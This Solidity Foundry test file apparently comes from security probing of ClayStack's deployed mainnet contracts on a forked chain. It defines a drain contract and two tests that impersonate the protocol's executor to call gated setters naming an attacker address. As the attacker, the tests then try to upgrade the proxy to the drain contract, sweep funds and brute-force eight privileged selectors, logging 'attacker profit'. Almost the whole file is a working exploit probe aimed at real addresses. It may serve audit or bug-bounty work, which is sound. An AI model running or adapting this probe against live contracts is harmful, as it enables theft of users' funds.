// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

contract D3 {
    function drain(address payable to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @title H-07 — chained probe: executor-gated setters -> permission escalation?
contract ClayStackH07ChainTest is Test {
    address constant CLAYMAIN = 0x331312DAbaf3d69138c047AaC278c9f9e0E8FFf8;
    address constant CLAYMAIN2 = 0x87393BE8ac323F2E63520A6184e5A8A9CC9fC051;
    address constant EXECUTOR = 0x4c06A181EDAfE572c44aB2a818B625a927484519;
    address constant ADMIN_EOA = 0xa72DF45A431B12EF4E37493D2bCf3D19Af3D24FA;
    address attacker = address(0xF00D);

    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant NS_A00 = 0xf364fa666b2e082663ca7dd04c16a2c736d1990df80fd97015fe242a48f33a00;
    bytes32 constant NS_A03 = 0xf364fa666b2e082663ca7dd04c16a2c736d1990df80fd97015fe242a48f33a03;
    bytes32 constant NS_A0C = 0xf364fa666b2e082663ca7dd04c16a2c736d1990df80fd97015fe242a48f33a0c;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        vm.createSelectFork(rpc);
        vm.deal(attacker, 100 ether);
    }

    function _dump(string memory tag) internal {
        emit log_named_string("-- dump", tag);
        emit log_named_address("clayMain impl", address(uint160(uint256(vm.load(CLAYMAIN, IMPL_SLOT)))));
        emit log_named_address("clayMain admin", address(uint160(uint256(vm.load(CLAYMAIN, ADMIN_SLOT)))));
        emit log_named_bytes32("clayMain ns a00", vm.load(CLAYMAIN, NS_A00));
        emit log_named_bytes32("clayMain ns a03", vm.load(CLAYMAIN, NS_A03));
        emit log_named_bytes32("clayMain ns a0c", vm.load(CLAYMAIN, NS_A0C));
    }

    /// executor calls the two setters that succeeded, then we inspect storage
    function test_h07_executor_setters_then_retry() public {
        _dump("before");
        vm.prank(EXECUTOR);
        (bool ok1, ) = CLAYMAIN.call(abi.encodeWithSelector(0x9eb6ef66, CLAYMAIN, attacker));
        emit log_named_string("executor 9eb6ef66(clayMain,attacker) ok?", ok1 ? "YES" : "no");
        vm.prank(EXECUTOR);
        (bool ok2, ) = CLAYMAIN.call(abi.encodeWithSelector(0x753d02bd, attacker));
        emit log_named_string("executor 753d02bd(attacker) ok?", ok2 ? "YES" : "no");
        _dump("after executor setters");

        // retry upgrade + sweep as attacker
        D3 d = new D3();
        vm.prank(attacker);
        (bool ok3, ) = CLAYMAIN.call(abi.encodeWithSelector(0x3659cfe6, address(d)));
        emit log_named_string("attacker upgradeTo after setters ok?", ok3 ? "YES" : "no");
        emit log_named_address("clayMain impl now", address(uint160(uint256(vm.load(CLAYMAIN, IMPL_SLOT)))));

        address[] memory toks = new address[](0);
        uint256 balBefore = CLAYMAIN.balance;
        vm.prank(attacker);
        (bool ok4, ) = CLAYMAIN.call(abi.encodeWithSelector(0x8c84497d, attacker, toks));
        emit log_named_string("attacker sweep after setters ok?", ok4 ? "YES" : "no");
        emit log_named_decimal_uint("clayMain ETH delta", balBefore - CLAYMAIN.balance, 18);

        // also try the 0x278f7943 admin-selector on the executor as attacker (no-op earlier?)
        vm.prank(attacker);
        (bool ok5, ) = EXECUTOR.call(abi.encodeWithSelector(0x278f7943, address(d), ""));
        emit log_named_string("attacker executor 278f7943(addr,bytes) ok?", ok5 ? "YES" : "no");
        emit log_named_address("executor impl now", address(uint160(uint256(vm.load(EXECUTOR, IMPL_SLOT)))));
    }

    /// brute force: executor calls every gated selector on clayMain, then attacker drains
    function test_h07_executor_call_all_then_attacker() public {
        bytes[8] memory calls;
        calls[0] = abi.encodeWithSelector(0x753d02bd, attacker);
        calls[1] = abi.encodeWithSelector(0x9eb6ef66, CLAYMAIN, attacker);
        calls[2] = abi.encodeWithSelector(0x42294bb0, attacker, uint256(0), uint256(0));
        calls[3] = abi.encodeWithSelector(0xf3314a61, attacker);
        calls[4] = abi.encodeWithSelector(0xe0c30834, attacker, uint256(0));
        calls[5] = abi.encodeWithSelector(0x8c84497d, attacker, uint256(0x40));
        calls[6] = abi.encodeWithSelector(0x1c0f5759, CLAYMAIN, false, false);
        calls[7] = abi.encodeWithSelector(0x108ed7ac, CLAYMAIN, new bytes4[](0), new bool[](0));
        for (uint256 i = 0; i < 8; i++) {
            vm.prank(EXECUTOR);
            (bool ok, ) = CLAYMAIN.call(calls[i]);
            emit log_named_string(string.concat("executor call#", vm.toString(i), " ok?"), ok ? "YES" : "no");
        }
        _dump("after all executor calls");
        // attacker retries the value paths
        D3 d = new D3();
        vm.prank(attacker);
        (bool okA, ) = CLAYMAIN.call(abi.encodeWithSelector(0x3659cfe6, address(d)));
        emit log_named_string("attacker upgradeTo ok?", okA ? "YES" : "no");
        uint256 balBefore = CLAYMAIN.balance;
        vm.prank(attacker);
        (bool okB, ) = CLAYMAIN.call(abi.encodeWithSelector(0x8c84497d, attacker, uint256(0x40)));
        emit log_named_string("attacker 8c84497d ok?", okB ? "YES" : "no");
        vm.prank(attacker);
        (bool okC, ) = CLAYMAIN.call(abi.encodeWithSelector(0xe0c30834, attacker, uint256(0)));
        emit log_named_string("attacker e0c30834 ok?", okC ? "YES" : "no");
        emit log_named_decimal_uint("clayMain ETH delta", balBefore - CLAYMAIN.balance, 18);
        emit log_named_decimal_uint("attacker profit", attacker.balance - 100 ether, 18);
    }
}
